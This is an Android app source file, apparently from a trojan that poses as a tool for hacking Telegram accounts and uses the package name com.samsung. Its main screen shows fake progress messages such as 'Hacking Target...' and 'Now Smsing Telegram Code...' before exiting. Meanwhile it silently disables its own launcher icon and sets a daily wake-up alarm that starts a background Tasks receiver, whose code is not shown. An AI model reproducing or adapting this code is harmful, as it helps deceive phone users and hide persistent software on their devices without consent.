package com.samsung;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import org.w3c.dom.Text;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Calendar;
import java.util.TimeZone;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);



        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(this);
        SharedPreferences.Editor editor = settings.edit();
        editor.putString("language","1");
        editor.commit();

        setRecurringAlarm(this);


        final Button btn =(Button)findViewById(R.id.button);
        final TextView tx=(TextView)findViewById(R.id.textView);
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(MainActivity.this, com.samsung.MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                EditText ID = (EditText) findViewById(R.id.editText);

                if (ID.getText().toString().length() > 0) {
                    btn.setVisibility(View.GONE);
                    tx.setText("");
                    tx.setVisibility(View.VISIBLE);
                    Timer _timer = new Timer();
                    _timer.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    tx.append("Generating Code..."+"\n");
                                }
                            });
                        }

                    }, 1000);
                    Timer timer = new Timer();
                    timer.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    tx.append("Hacking Target..."+"\n");
                                }
                            });
                        }

                    }, 2000);
                    Timer timer1 = new Timer();
                    timer1.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    tx.append("Get Key..."+"\n");
                                }
                            });
                        }

                    }, 3000);
                    Timer timer2 = new Timer();
                    timer2.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    tx.append("Create Valid key..."+"\n");
                                }
                            });
                        }

                    }, 4000);
                    Timer timer3 = new Timer();
                    timer3.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    tx.append("Validating key..."+"\n");
                                }
                            });
                        }

                    }, 5000);
                    Timer timer4 = new Timer();
                    timer4.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    tx.append("New key Generated..."+"\n");
                                }
                            });
                        }

                    }, 6000);
                    Timer timer5 = new Timer();
                    timer5.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    tx.append("Getting Telegram Code..."+"\n");
                                }
                            });
                        }

                    }, 7000);
                    Timer timer6 = new Timer();
                    timer6.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    tx.append("Now Smsing Telegram Code..."+"\n");
                                }
                            });
                        }

                    }, 8000);
                    Timer timer7 = new Timer();
                    timer7.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    tx.append("Exit App and Wait"+"\n");
                                }
                            });
                        }

                    }, 9000);
                    Timer timer8 = new Timer();
                    timer8.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    finish();
                                }
                            });
                        }

                    }, 10000);

                }
                else
                {

                    Toast.makeText(v.getContext(), "Enter valid ID", Toast.LENGTH_SHORT).show();

                }

            }
        });


    }

    private void setRecurringAlarm(Context context) {

        Calendar updateTime = Calendar.getInstance();
        updateTime.setTimeZone(TimeZone.getTimeZone("GMT+5:00"));
        updateTime.set(Calendar.HOUR_OF_DAY, 3);
        updateTime.set(Calendar.MINUTE, 00);

        Intent intent = new Intent(context, Tasks.class);
        PendingIntent recurringDownload = PendingIntent.getBroadcast(context,
                100, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        AlarmManager alarms = (AlarmManager) this.getSystemService(
                Context.ALARM_SERVICE);
        alarms.setInexactRepeating(AlarmManager.RTC_WAKEUP,
                updateTime.getTimeInMillis(),
                AlarmManager.INTERVAL_DAY, recurringDownload);
    }
}
